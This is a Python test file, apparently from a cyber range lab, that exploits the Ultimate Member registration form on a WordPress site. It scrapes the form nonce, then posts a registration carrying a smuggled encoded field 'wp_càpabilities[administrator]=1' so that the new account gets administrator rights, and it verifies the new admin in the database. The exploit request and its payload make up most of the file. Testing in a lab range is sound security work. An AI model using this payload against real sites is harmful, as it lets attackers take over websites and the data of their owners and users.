import re
import uuid

from conftest import TARGET_PUBLIC
from range import ATTACKER, run

CORP_DB = "corp-db"
CORP_HOST = "Host: corp.com"
ROGUE_KEY = "wp_c%C3%A0pabilities%5Badministrator%5D=1"
NONCE = re.compile(r'name="_wpnonce" value="([^"]+)"')


def _admin_ids():
    out = run(CORP_DB, [
        "mysql", "-uwordpress", "-pwordpress", "wordpress", "-N", "-e",
        "SELECT user_id FROM wp_usermeta WHERE meta_key='wp_capabilities' "
        "AND meta_value LIKE '%administrator%';",
    ]).stdout
    return {int(x) for x in out.split()}


def _register_nonce():
    page = run(ATTACKER, [
        "curl", "-s", "-H", CORP_HOST, "--max-time", "20",
        f"{TARGET_PUBLIC}/register/",
    ]).stdout
    found = NONCE.search(page)
    assert found, "no _wpnonce on the live UM register form; is corp-wp up?"
    return found.group(1)


def _submit(nonce, login):
    return run(ATTACKER, [
        "curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", "--max-time", "20",
        "-H", CORP_HOST,
        "--data", "form_id=5",
        "--data", "um_request=",
        "--data", f"_wpnonce={nonce}",
        "--data", "_wp_http_referer=/register/",
        "--data", f"user_login-5={login}",
        "--data", "first_name-5=North",
        "--data", "last_name-5=Wind",
        "--data", f"user_email-5={login}@example.com",
        "--data", "user_password-5=Str0ng-Pass-9271",
        "--data", "confirm_user_password-5=Str0ng-Pass-9271",
        "--data", ROGUE_KEY,
        f"{TARGET_PUBLIC}/register/",
    ]).stdout.strip()


def test_the_rogue_admin_registration_commits_a_new_administrator(stack_is_up):
    before = _admin_ids()
    login = f"rogue_{uuid.uuid4().hex[:8]}"

    code = _submit(_register_nonce(), login)
    assert code == "302", f"registration did not complete, got {code!r}"

    after = _admin_ids()
    created = after - before
    assert created, "no new administrator was committed by the UM rogue-admin registration"
    assert all(uid > 1 for uid in created), (
        f"expected a non-baseline administrator (id > 1), got {sorted(created)}"
    )
